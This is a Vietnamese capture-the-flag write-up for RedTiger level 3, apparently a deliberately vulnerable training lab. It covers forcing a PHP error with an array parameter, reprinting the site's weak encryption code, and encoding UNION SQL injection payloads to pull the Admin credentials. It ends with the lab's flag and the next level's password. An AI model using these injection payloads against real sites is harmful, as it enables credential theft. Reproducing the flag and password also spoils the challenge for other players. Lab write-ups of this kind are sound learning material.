#BÁO CÁO LEVEL 3
 
 `http://redtiger.labs.overthewire.org/level3.php`

 ![text](http://i.imgur.com/93Qmkau.png)

 -Click vào `Cow` hoặc `Admin` thì sẽ dẫn tới một đường Link `http://redtiger.labs.overthewire.org/level3.php?usr=MDQyMjExMDE0MTgyMTQw.`
 	
 +Ta có thể thấy đoạn username=`MDQyMjExMDE0MTgyMTQw` Là một đoạn đã được mã hóa. Và `usr` biểu thị Cho Where của nó. Để text xem nó bị mã hóa ra sao thì ta thêm `[]` vào sau usr.
 	
 +`usr[]` ở đây có nghĩa là truyền giả định vào một mảng.Tất cả các hàm chỉ nhận chuỗi sẽ show ra lỗi vì lí do là người lập trình không ẩn lỗi đó đi.

-`http://redtiger.labs.overthewire.org/level3.php?usr[]=MDQyMjExMDE0MTgyMTQw`

![text](http://i.imgur.com/QxspsXD.png)

+Ta thấy xuất hiện đoạn lỗi ` Warning: preg_match() expects parameter 2 to be string, array given in /var/www/html/hackit/urlcrypt.inc on line 25`

-Dựa theo lỗi đó truy cập vào đường link: `http://redtiger.labs.overthewire.org/urlcrypt.inc`

+Vào source của nó ta sẽ được một đoạn Code mã hóa như sau:
```sh
<?php

	// warning! ugly code ahead :)
  		
	function encrypt($str)
	{
		$cryptedstr = "";
		srand(3284724);
		for ($i =0; $i < strlen($str); $i++)
		{
			$temp = ord(substr($str,$i,1)) ^ rand(0, 255);
			
			while(strlen($temp)<3)
			{
				$temp = "0".$temp;
			}
			$cryptedstr .= $temp. "";
		}
		return base64_encode($cryptedstr);
	}
  
	function decrypt ($str)
	{
		srand(3284724);
		if(preg_match('%^[a-zA-Z0-9/+]*={0,2}$%',$str))
		{
			$str = base64_decode($str);
			if ($str != "" && $str != null && $str != false)
			{
				$decStr = "";
				
				for ($i=0; $i < strlen($str); $i+=3)
				{
					$array[$i/3] = substr($str,$i,3);
				}

				foreach($array as $s)
				{
					$a = $s ^ rand(0, 255);
					$decStr .= chr($a);
				}
				
				return $decStr;
			}
			return false;
		}
		return false;
	}
?>
```
-Đây là một đoạn Code mã hóa của PHP. Chứng tỏ một điều rằng nếu ta muốn khai thác lỗi thì mọi câu lệnh ta nhập vào phải được mã hóa trước khi truy vấn.

-Vì đây là PHP nên ta dùng trang `http://www.writephponline.com/` này để chạy code. Và dùng riêng đoạn này để mã hóa:
```sh
function encrypt($str)
	{
		$cryptedstr = "";
		srand(3284724);
		for ($i =0; $i < strlen($str); $i++)
		{
			$temp = ord(substr($str,$i,1)) ^ rand(0, 255);
			
			while(strlen($temp)<3)
			{
				$temp = "0".$temp;
			}
			$cryptedstr .= $temp. "";
		}
		return base64_encode($cryptedstr);
	}
```

-Bắt đầu khai thác các lỗi trong SQL-Injection:
	
	1.Khai thác cột bị lỗi và thông tin trong cột: `' Union Select 1,2,3,4,5,6,7#` .  Ở đây `'` và `#` Có nghĩa là bỏ qua việc check where và comment. Tất nhiên câu lệnh phải được mã hóa trước khi truy vấn.

![text](http://i.imgur.com/5CNxMSo.png)

	2. Ta thu được một trang mới với table,cột, và thuộc tính của cột:

![text](http://i.imgur.com/iUNvEUx.png)	

	3.Dựa vào thông tin thu được tiếp tục truy vấn để tìm ra username và password: `' Union Select 1,username,3,password,5,6,7 From level3_users Where username='Admin'#` Tất nhiên đoạn lệnh này phải được mã hóa:

![text](http://i.imgur.com/ZRKABMJ.png)
	
	4.Kết quả thu được:

![text](http://i.imgur.com/5SO9pRY.png)

```sh

Login correct. You are admin :);


You can raise your wechall.net score with this flag: a707b245a60d570d25a0449c2a516eca

The password for the next level is: there_is_no_bug

Hackit
```

	BÁO CÁO KẾT THÚC.

				







